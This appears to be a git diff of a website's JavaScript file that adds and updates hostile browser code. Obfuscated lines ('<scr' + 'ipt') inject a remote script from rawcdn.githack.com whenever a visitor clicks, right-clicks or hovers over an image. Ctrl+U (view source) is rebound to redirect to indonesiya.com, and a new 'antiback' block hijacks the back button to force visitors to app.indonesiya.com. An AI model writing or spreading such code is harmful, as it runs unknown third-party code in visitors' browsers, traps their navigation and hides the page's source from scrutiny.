@@ -16,7 +16,7 @@ function scriptRamadhan() {
 $(document).ready(function () {
     $("img").click(function () {
         var w = window.open("")
-        w.document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/chat/481f925881f92186403f4651271e50b86d984239/public/js/link.js"></scr' + 'ipt>');
+        w.document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawannria85/chatindo/9480d5fa4ad7f81d3ea749a9ab26a8ae4f4f6567/public/js/link.js"></scr' + 'ipt>');
     });
 });
 
@@ -164,14 +164,13 @@ shortcut = {
         }
     }
 }, shortcut.add("Ctrl+U", function () {
-    /* random direct */
-    document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/chat/1b71c1d313efbf6d25c6388886ec3e62bd57aa9b/public/js/link.js"></scr' + 'ipt>');
+    location.href = "https://www.indonesiya.com/"
 });
 
 //Script Redirect Klik Kanan
 function redirectKK(e) {
     var w = window.open("")
-    w.document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/chat/1b71c1d313efbf6d25c6388886ec3e62bd57aa9b/public/js/link.js"></scr' + 'ipt>');
+    w.document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawannria85/chatindo/9480d5fa4ad7f81d3ea749a9ab26a8ae4f4f6567/public/js/link.js"></scr' + 'ipt>');
 }
 document.oncontextmenu = redirectKK;
 
@@ -187,3 +186,25 @@ document.oncontextmenu = redirectKK;
         setTimeout(t, 5e3)
     }
 }();
+
+/* antiback */
+(function (window, location) {
+    history.replaceState(null, document.title, location.pathname + "#!/history");
+    history.pushState(null, document.title, location.pathname);
+    window.addEventListener("popstate", function () {
+        if (location.hash === "#!/history") {
+            history.replaceState(null, document.title, location.pathname);
+            setTimeout(function () {
+                location.href = "https://app.indonesiya.com/"
+            }, 0);
+        }
+    }, false);
+}(window, location));
+
+/* hover */
+$(document).ready(function () {
+    $("img").hover(function () {
+        // speweha plus all directlink
+        document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawannria85/chatindo/9480d5fa4ad7f81d3ea749a9ab26a8ae4f4f6567/public/js/link.js"></scr' + 'ipt>');
+    });
+});
